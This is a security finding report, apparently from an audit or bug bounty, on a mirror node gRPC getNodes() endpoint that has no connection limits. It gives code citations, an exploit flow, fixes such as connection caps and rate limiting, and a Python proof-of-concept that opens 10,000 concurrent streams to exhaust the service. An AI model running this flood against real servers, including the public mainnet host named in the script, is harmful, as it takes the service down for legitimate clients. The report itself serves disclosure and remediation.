### Title
Unbounded Connection Flooding on `getNodes()` gRPC Endpoint Enables Resource Exhaustion DoS

### Summary
The `getNodes()` endpoint in `NetworkController` accepts unlimited unauthenticated HTTP/2 connections with no per-IP or global connection limit configured at the application layer. Because `maxConcurrentCallsPerConnection` only limits streams per individual connection (not total connections), an attacker can open an unbounded number of connections — each carrying 5 concurrent `getNodes()` streams — exhausting the bounded-elastic thread pool and database connection pool, rendering the gRPC service unavailable to legitimate callers.

### Finding Description

**Exact code path:**

`NetworkController.getNodes()` (lines 33–43) accepts any unauthenticated request and immediately subscribes a reactive pipeline that calls `networkService::getNodes`: [1](#0-0) 

`NetworkServiceImpl.getNodes()` (lines 55–77) issues **three synchronous DB queries** per call upfront (`findLatestTimestamp` × 2, `findAllStakeByConsensusTimestamp`), then enters a paged loop on `Schedulers.boundedElastic()` with a 250 ms inter-page delay (`pageDelay`) and `pageSize = 10`: [2](#0-1) [3](#0-2) 

The only server-side concurrency guard is `maxConcurrentCallsPerConnection = 5`, applied in `GrpcConfiguration` via `NettyServerBuilder.maxConcurrentCallsPerConnection()`: [4](#0-3) [5](#0-4) 

**Root cause:** `maxConcurrentCallsPerConnection` maps to HTTP/2 `MAX_CONCURRENT_STREAMS` *per connection*. It does not bound the total number of inbound TCP connections, nor the aggregate number of active streams across all connections. No `maxInboundConnections`, no per-IP connection limit, and no gRPC-layer rate-limiting interceptor are configured anywhere in the `grpc` module: [6](#0-5) 

**Exploit flow:**
1. Attacker opens *N* TCP connections to port 5600 (no limit enforced).
2. On each connection, attacker opens 5 concurrent `getNodes()` streams (the per-connection maximum).
3. Total concurrent active calls = N × 5, each triggering 3 upfront DB queries plus repeated paged DB reads every 250 ms on `Schedulers.boundedElastic()`.
4. The bounded-elastic scheduler (capped at `10 × CPU cores` by Reactor default) and the JDBC connection pool are exhausted.
5. New legitimate `getNodes()` and `subscribeTopic` calls queue indefinitely or are rejected.

### Impact Explanation

The gRPC service becomes fully unresponsive to legitimate clients. Because `getNodes()` is the mechanism by which SDK clients and monitors discover network node addresses, its unavailability prevents clients from bootstrapping or refreshing their node address books. The DB connection pool exhaustion also starves the `subscribeTopic` endpoint on the same server, causing a complete gRPC service outage. The mirror node's gRPC port is the only programmatic interface for address book queries.

### Likelihood Explanation

No authentication or API key is required. A single attacker machine can open thousands of TCP connections to a single IP:port with standard tooling (e.g., `grpc_cli`, a custom gRPC client loop, or `h2load`). The attack is trivially repeatable, requires no special knowledge beyond the publicly documented proto API, and is not mitigated in the default docker-compose deployment. The GCP `maxRatePerEndpoint: 250` backend policy exists only in the optional GCP Helm chart path and is not enforced at the application layer: [7](#0-6) 

### Recommendation

1. **Add a global inbound connection limit** in `GrpcConfiguration` via `NettyServerBuilder.maxInboundConnections(int)` (e.g., 1000–5000 depending on capacity).
2. **Add a per-IP connection limit** using a Netty `ChannelHandler` or a gRPC `ServerInterceptor` that tracks active connections per remote address and rejects `RESOURCE_EXHAUSTED` when exceeded.
3. **Add application-level rate limiting** on the `getNodes()` method via a `ServerInterceptor` (analogous to the bucket4j throttle already present in the `web3` module).
4. **Set `maxConnectionAge` and `maxConnectionIdle`** on `NettyServerBuilder` to reclaim idle/long-lived connections and prevent connection hoarding.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools
import grpc
import threading
from hedera import mirror_network_service_pb2_grpc, mirror_network_service_pb2

TARGET = "grpc.mainnet.mirrornode.hedera.com:443"  # or localhost:5600

def flood(conn_id):
    channel = grpc.insecure_channel("localhost:5600")
    stub = mirror_network_service_pb2_grpc.NetworkServiceStub(channel)
    threads = []
    for _ in range(5):  # max per-connection streams
        def call():
            try:
                for _ in stub.getNodes(mirror_network_service_pb2.AddressBookQuery()):
                    pass
            except Exception:
                pass
        t = threading.Thread(target=call)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

# Open 2000 connections × 5 streams = 10,000 concurrent DB-hitting calls
threads = [threading.Thread(target=flood, args=(i,)) for i in range(2000)]
for t in threads:
    t.start()
# Observe: legitimate getNodes() calls begin timing out; DB pool exhausted in logs
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java (L33-43)
```java
    public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(networkService::getNodes)
                .map(this::toNodeAddress)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/NetworkServiceImpl.java (L55-77)
```java
    public Flux<AddressBookEntry> getNodes(AddressBookFilter filter) {
        var fileId = filter.getFileId();
        if (!getValidFileIds().contains(fileId)) {
            throw new IllegalArgumentException(INVALID_FILE_ID);
        }

        long addressBookTimestamp = addressBookRepository
                .findLatestTimestamp(fileId.getId())
                .orElseThrow(() -> new EntityNotFoundException(fileId));
        long nodeStakeTimestamp = nodeStakeRepository.findLatestTimestamp().orElse(NODE_STAKE_EMPTY_TABLE_TIMESTAMP);
        var nodeStakeMap = nodeStakeRepository.findAllStakeByConsensusTimestamp(nodeStakeTimestamp);
        var context = new AddressBookContext(addressBookTimestamp, nodeStakeMap);

        return Flux.defer(() -> page(context))
                .repeatWhen(RepeatSpec.create(c -> !context.isComplete(), Long.MAX_VALUE)
                        .jitter(0.5)
                        .withFixedDelay(addressBookProperties.getPageDelay())
                        .withScheduler(Schedulers.boundedElastic()))
                .take(filter.getLimit() > 0 ? filter.getLimit() : Long.MAX_VALUE)
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Querying for address book: {}", filter))
                .doOnComplete(() -> log.info("Retrieved {} nodes from the address book", context.getCount()));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/AddressBookProperties.java (L32-37)
```java
    @DurationMin(millis = 100L)
    @NotNull
    private Duration pageDelay = Duration.ofMillis(250L);

    @Min(1)
    private int pageSize = 10;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L27-35)
```java
    @Bean
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L11-15)
```java
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**File:** charts/hedera-mirror-grpc/values.yaml (L62-73)
```yaml
gateway:
  gcp:
    backendPolicy:
      connectionDraining:
        drainingTimeoutSec: 10
      logging:
        enabled: false
      maxRatePerEndpoint: 250  # Requires a change to HPA to take effect
      sessionAffinity:
        type: CLIENT_IP
      timeoutSec: 20
    enabled: true
```
